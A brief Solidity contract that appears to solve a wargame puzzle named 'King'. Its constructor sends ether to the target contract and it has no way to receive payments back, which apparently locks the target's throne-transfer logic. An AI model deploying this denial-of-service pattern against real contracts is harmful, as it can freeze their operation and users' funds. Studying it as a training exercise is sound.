// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {
}

contract attackKing{
    King public kingContract;
    constructor(address _King) payable{
        kingContract = King(_King);
        (bool success, ) = _King.call{value: msg.value}("");
    }

}
